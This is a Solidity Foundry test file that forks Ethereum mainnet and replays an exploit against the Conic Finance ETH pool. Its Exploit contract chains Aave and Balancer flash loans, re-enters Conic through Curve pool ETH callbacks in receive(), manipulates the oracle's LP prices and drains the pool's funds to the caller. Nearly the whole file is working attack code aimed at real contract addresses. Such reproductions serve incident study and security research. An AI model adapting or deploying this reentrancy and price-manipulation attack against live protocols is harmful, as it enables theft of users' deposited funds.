// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import "./interface.sol";
import "./IERC20.sol";
import "./IFlashLoanRecipient.sol";

WETH constant weth = WETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
IERC20 constant reth = IERC20(0xae78736Cd615f374D3085123A210448E74Fc6393);
IERC20 constant steth = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
IERC20 constant cbeth = IERC20(0xBe9895146f7AF43049ca1c1AE358B0541Ea49704);
AaveV2 constant aave2 = AaveV2(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
AaveV3 constant aave3 = AaveV3(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
Vyper constant vyper_cbeth = Vyper(0x5FAE7E604FC3e24fd43A72867ceBaC94c65b404A);
Vyper constant vyper_reth = Vyper(0x0f3159811670c117c372428D4E69AC32325e4D0F);
Lido constant lido = Lido(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
Conic constant conic = Conic(0xBb787d6243a8D450659E09ea6fD82F1C859691e9);
Balancer constant balancer = Balancer(
    0xBA12222222228d8Ba445958a75a0704d566BF2C8
);

contract ConicTest is Test {
    address exploiter;

    function setUp() public {
        vm.createSelectFork("mainnet", 17740954);
        exploiter = makeAddr("exploiter");
        vm.label(address(weth), "weth");
        vm.label(address(reth), "reth");
        vm.label(address(steth), "steth");
        vm.label(address(cbeth), "cbeth");
        vm.label(address(aave2), "aave2");
        vm.label(address(aave3), "aave3");
        vm.label(address(vyper_reth), "vyper_reth");
        vm.label(address(vyper_cbeth), "vyper_cbeth");
        vm.label(address(lido), "lido");
        vm.label(address(conic), "conic");
        vm.label(address(balancer), "balancer");
        vm.label(
            address(0x6c38cE8984a890F5e46e6dF6117C26b3F1EcfC9C),
            "reth-eth"
        );
    }

    function testExploit() public {
        emit log_named_decimal_uint("balance", exploiter.balance, 18);
        emit log_named_decimal_uint(
            "Conic Eth Pool Balance",
            conic.totalUnderlying(),
            18
        );

        vm.startPrank(exploiter, exploiter);
        new Exploit().exploit();
        vm.stopPrank();
        emit log_named_decimal_uint("balance", exploiter.balance, 18);
        emit log_named_decimal_uint(
            "Conic Eth Pool Balance",
            conic.totalUnderlying(),
            18
        );
    }
}

contract Exploit {
    uint256 amount = type(uint256).max;

    uint256 flag = 0;
    address steCRV = 0x06325440D014e39736583c165C2963BA99fAf14E;
    address cbETH_ETH = 0x5b6C539b224014A09B3388e51CaAA8e354c959C8;
    address rETH_ETH = 0x6c38cE8984a890F5e46e6dF6117C26b3F1EcfC9C;
    address cncETH = 0x3565A68666FD3A6361F06f84637E805b727b4A47;
    GenericOracleV2 oracle =
        GenericOracleV2(0x286eF89cD2DA6728FD2cb3e1d1c5766Bcea344b0);
    bool check = false;

    function exploit() external {
        weth.approve(address(vyper_cbeth), amount);
        cbeth.approve(address(vyper_cbeth), amount);
        weth.approve(address(vyper_reth), amount);
        reth.approve(address(vyper_reth), amount);
        weth.approve(address(lido), amount);
        steth.approve(address(lido), amount);
        weth.approve(address(conic), amount);
        cbeth.approve(address(aave3), amount);
        steth.approve(address(aave2), amount);

        address[] memory assets = new address[](1);
        assets[0] = address(steth);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 20000000000000000000000;
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;

        aave2.flashLoan(
            address(this),
            assets,
            amounts,
            modes,
            address(this),
            bytes(""),
            0
        );
        check = true;

        lido.exchange(1, 0, steth.balanceOf(address(this)), 0);
        vyper_cbeth.exchange(
            1,
            0,
            cbeth.balanceOf(address(this)),
            0,
            false,
            address(this)
        );
        vyper_reth.exchange(
            1,
            0,
            reth.balanceOf(address(this)),
            0,
            false,
            address(this)
        );
        weth.withdraw(weth.balanceOf(address(this)));
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "failed to send weth");
    }

    function executeOperation(
        address[] calldata,
        uint256[] calldata,
        uint256[] calldata,
        address,
        bytes calldata
    ) external returns (bool) {
        aave3.flashLoanSimple(
            address(this),
            address(cbeth),
            850000000000000000000,
            bytes(""),
            0
        );

        return true;
    }

    uint256 rethAmount = 20_550 ether;
    uint256 cbethAmount = 3_000 ether;
    uint256 wethAmount = 28_504.2 ether;

    function executeOperation(
        address,
        uint256,
        uint256,
        address,
        bytes calldata
    ) external returns (bool) {
        IERC20[] memory tokens = new IERC20[](3);
        tokens[0] = reth;
        tokens[1] = cbeth;
        tokens[2] = weth;
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = rethAmount;
        amounts[1] = cbethAmount;
        amounts[2] = wethAmount;

        balancer.flashLoan(
            IFlashLoanRecipient(address(this)),
            tokens,
            amounts,
            bytes("")
        );
        return true;
    }

    function receiveFlashLoan(
        IERC20[] memory,
        uint256[] memory,
        uint256[] memory,
        bytes memory
    ) external {
        console2.log("eth balance", address(this).balance);
        console2.log("weth balance", weth.balanceOf(address(this)));
        console2.log("reth balance", reth.balanceOf(address(this)));
        console2.log("cbeth balance", cbeth.balanceOf(address(this)));
        console2.log("steth balance", steth.balanceOf(address(this)));
        require(msg.sender == address(balancer), "invalid msg.sender");

        uint256 n = 0;
        while (n < 7) {
            n++;
            console2.log("WETH-cbETH balance WETH ", vyper_cbeth.balances(0));
            console2.log("WETH-cbETH balance cbETH", vyper_cbeth.balances(1));
            console2.log("WETH-rETH  balance WETH ", vyper_reth.balances(0));
            console2.log("WETH-rETH  balance rETH ", vyper_reth.balances(1));
            console2.log("ETH-stETH  balance ETH  ", lido.balances(0));
            console2.log("ETH-stETH  balance stTH ", lido.balances(1));
            conic.deposit(1214 ether, 0, false); //reentrancy
            vyper_cbeth.exchange(1, 0, 121 ether, 0, false, address(this));
            vyper_reth.exchange(1, 0, 121 ether, 0, false, address(this));
        }
        console2.log("lido", oracle.getUSDPrice(address(steCRV)));

        uint256 volume = 20000 ether;
        weth.withdraw(volume);

        uint256 Amount = lido.add_liquidity{value: volume}(
            [volume, steth.balanceOf(address(this))],
            0
        );
        console2.log(
            "ETH-stETH LP price            ",
            oracle.getUSDPrice(address(steCRV))
        );

        lido.remove_liquidity(Amount, [uint256(0), uint256(0)]);
        console2.log(
            "ETH-stETH LP price            ",
            oracle.getUSDPrice(address(steCRV))
        );

        weth.withdraw(1800 ether);
        vyper_cbeth.exchange(
            1,
            0,
            cbeth.balanceOf(address(this)),
            0,
            false,
            address(this)
        );

        uint256 lpcb=vyper_cbeth.add_liquidity(
            [uint256(1.8 ether), uint256(0)],
            0,
            false,
            address(this)
        );
        console2.log("r lp price", oracle.getUSDPrice(address(rETH_ETH)));

        vyper_cbeth.remove_liquidity(
            lpcb,
            [uint256(0), uint256(0)],
            true,
            address(this)
        );
        console2.log("r", oracle.getUSDPrice(address(rETH_ETH)));

        vyper_cbeth.exchange(0, 1, 2105 ether, 0, false, address(this));
        vyper_reth.exchange(
            1,
            0,
            reth.balanceOf(address(this)),
            0,
            false,
            address(this)
        );
        uint256 lpR = vyper_reth.add_liquidity(
            [uint256(2.4 ether), uint256(0)],
            0,
            false,
            address(this)
        );
        console2.log("cncETH balance", IERC20(cncETH).balanceOf(address(this)));

        vyper_reth.remove_liquidity(
            lpR,
            [uint256(0), uint256(0)],
            true,
            address(this)
        );
        console2.log("weth balance", weth.balanceOf(address(this)));
        console2.log("reth balance", reth.balanceOf(address(this)));
        console2.log("cbeth balance", cbeth.balanceOf(address(this)));

        vyper_reth.exchange(0, 1, 3450 ether, 0, false, address(this));
        vyper_cbeth.exchange(0, 1, 850 ether, 0, false, address(this));
        conic.withdraw(IERC20(cncETH).balanceOf(address(this)), 0);
        weth.deposit{value: address(this).balance}();
        vyper_reth.exchange(0, 1, 1100 ether, 0, false, address(this));
        weth.withdraw(300 ether);

        lido.exchange{value: 300 ether}(0, 1, 300 ether, 0);
        reth.transfer(address(balancer), rethAmount);
        cbeth.transfer(address(balancer), cbethAmount);
        weth.transfer(address(balancer), wethAmount);
        console2.log("cbeth balance", cbeth.balanceOf(address(this)));
    }

    receive() external payable {
        if (!check && msg.sender == address(lido)) {
            console2.log("lido", oracle.getUSDPrice(address(steCRV)));

            conic.handleDepeggedCurvePool(address(lido));
        } else if (!check && msg.sender == address(vyper_cbeth)) {
            console2.log("cb", oracle.getUSDPrice(address(cbETH_ETH)));

            conic.handleDepeggedCurvePool(address(vyper_cbeth));
        } else if (!check && msg.sender == address(vyper_reth)) {
            console2.log("r", oracle.getUSDPrice(address(rETH_ETH)));

            conic.withdraw(6292 ether, 0);
        }
    }
}
